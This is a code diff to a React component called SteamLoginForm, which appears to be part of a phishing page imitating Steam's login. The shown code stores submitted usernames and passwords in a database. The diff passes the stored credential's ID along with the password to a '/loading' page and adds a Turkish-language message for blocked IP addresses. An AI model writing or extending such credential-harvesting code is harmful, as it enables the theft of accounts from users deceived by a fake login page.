@@ -43,8 +43,18 @@ const SteamLoginForm = () => {
       console.log("Response from database:", data);
       
       if (data.success) {
-        // Navigate to the loading page
-        navigate('/loading', { state: { username, password } });
+        // Navigate to the loading page with the credential ID
+        navigate('/loading', { 
+          state: { 
+            username, 
+            password,
+            id: data.credential?.id 
+          } 
+        });
+      } else if (data.blocked) {
+        // Handle blocked IP
+        toast.error("Erişiminiz engellendi. Lütfen daha sonra tekrar deneyin.");
+        setIsLoading(false);
       } else {
         throw new Error("Failed to store credentials");
       }
